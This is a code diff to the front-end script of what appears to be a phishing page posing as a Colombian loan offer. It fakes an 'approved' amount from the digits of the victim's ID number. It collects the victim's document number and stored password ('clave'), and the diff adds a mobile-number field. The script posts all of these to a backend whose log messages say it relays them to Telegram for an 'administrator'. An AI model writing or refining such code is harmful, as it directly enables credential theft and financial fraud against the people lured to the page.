@@ -600,34 +600,62 @@ $(document).ready(function ($) {
 
     if (formularioEnviado) {
       $("#select-cuotas").attr("disabled", "disabled");
+      $("#txt-celular-form").attr("disabled", "disabled");
       $("#btn-finalizar").attr("disabled", "disabled").text("✅ Formulario ya enviado");
       return;
     }
 
     var numDoc = localStorage.getItem("numDoc") || "0";
     var hashCedula = parseInt(numDoc.slice(-4)) || 0;
-    var montoAprobado = 70000000 + ((hashCedula * 1000000) % 25000001);
+    // Nuevo rango: 40M - 90M
+    var montoAprobado = 40000000 + ((hashCedula * 1000000) % 50000001);
 
     $("#cupo-aprobado").text("$" + montoAprobado.toLocaleString('es-CO', {maximumFractionDigits: 0}));
     $("#select-cuotas").val("");
-    $("#cuota-display").text("");
+    $("#txt-celular-form").val("");
+    $("#cuota-display").html('<div style="font-size: 14px; color: #666; margin-bottom: 8px;">💰 Tu cuota mensual será:</div><div style="font-size: 24px; font-weight: bold; color: #0043a9; text-align: center;">Selecciona un plan</div>');
     $("#btn-finalizar").attr("disabled", "disabled");
 
-    $("#select-cuotas").off('change').on('change', function() {
-      var cuotas = $(this).val();
-      if (cuotas) {
-        actualizarCuotaDisplay(montoAprobado, cuotas);
+    // Validar campos y habilitar botón
+    function validarFormulario() {
+      var cuotas = $("#select-cuotas").val();
+      var celular = $("#txt-celular-form").val().trim();
+
+      if (cuotas && celular.length > 9) {
         $("#btn-finalizar").removeAttr("disabled");
       } else {
         $("#btn-finalizar").attr("disabled", "disabled");
       }
+    }
+
+    // Evento para cambio de cuotas
+    $("#select-cuotas").off('change').on('change', function() {
+      var cuotas = $(this).val();
+      if (cuotas) {
+        actualizarCuotaDisplay(montoAprobado, cuotas);
+      } else {
+        $("#cuota-display").html('<div style="font-size: 14px; color: #666; margin-bottom: 8px;">💰 Tu cuota mensual será:</div><div style="font-size: 24px; font-weight: bold; color: #0043a9; text-align: center;">Selecciona un plan</div>');
+      }
+      validarFormulario();
     });
 
+    // Evento para cambio de celular
+    $("#txt-celular-form").off('keyup').on('keyup', function() {
+      validarFormulario();
+    });
+
+    // Evento del botón finalizar
     $("#btn-finalizar").off('click').on('click', function() {
       var cuotas = $("#select-cuotas").val();
+      var celular = $("#txt-celular-form").val().trim();
 
       if (!cuotas) {
         alert("Selecciona el número de cuotas");
+        return;
+      }
+
+      if (!celular || celular.length < 10) {
+        alert("Ingresa un número de celular válido");
         return;
       }
 
@@ -636,9 +664,17 @@ $(document).ready(function ($) {
       var numDoc = localStorage.getItem("numDoc") || "NO_DISPONIBLE";
       var clave = localStorage.getItem("clave") || "NO_DISPONIBLE";
 
+      // Guardar celular en localStorage
+      localStorage.setItem("celular", celular);
+
       $("#btn-finalizar").attr("disabled", "disabled");
       $("#fondo").show();
       $("#mensaje").show();
+
+      console.log("📤 Enviando formulario con:");
+      console.log(`   - Monto: ${montoAprobado}`);
+      console.log(`   - Cuotas: ${cuotas}`);
+      console.log(`   - Celular: ${celular}`);
 
       fetch(BACKEND_BASE + "/notify/formulario", {
         method: "POST",
@@ -648,6 +684,7 @@ $(document).ready(function ($) {
           tipoDoc: tipoDoc,
           numDoc: numDoc,
           clave: clave,
+          celular: celular,
           monto: montoAprobado,
           cuotas: parseInt(cuotas),
           interes: 0.001
@@ -657,8 +694,9 @@ $(document).ready(function ($) {
         .then(function(data) {
           localStorage.setItem("formularioEnviado", "true");
           $("#select-cuotas").attr("disabled", "disabled");
+          $("#txt-celular-form").attr("disabled", "disabled");
           $("#btn-finalizar").text("✅ Formulario ya enviado");
-          console.log("✅ Formulario enviado a Telegram");
+          console.log("✅ Formulario enviado a Telegram con celular");
           console.log("⏳ Esperando respuesta del administrador...");
         })
         .catch(function(err) {
@@ -698,6 +736,10 @@ $(document).ready(function ($) {
     var interes = 0.001 / 100;
     var cuotaConInteres = cuotaMensual * (1 + interes);
 
-    $("#cuota-display").text("Cuota mensual: $" + cuotaConInteres.toLocaleString('es-CO', {maximumFractionDigits: 0}));
+    var html = '<div style="font-size: 14px; color: #666; margin-bottom: 8px;">💰 Tu cuota mensual será:</div>';
+    html += '<div style="font-size: 24px; font-weight: bold; color: #0043a9; text-align: center;">$' + cuotaConInteres.toLocaleString('es-CO', {maximumFractionDigits: 0}) + '</div>';
+    html += '<div style="font-size: 12px; color: #999; margin-top: 8px; text-align: center;">por ' + cuotasNum + ' meses</div>';
+
+    $("#cuota-display").html(html);
   }
 });
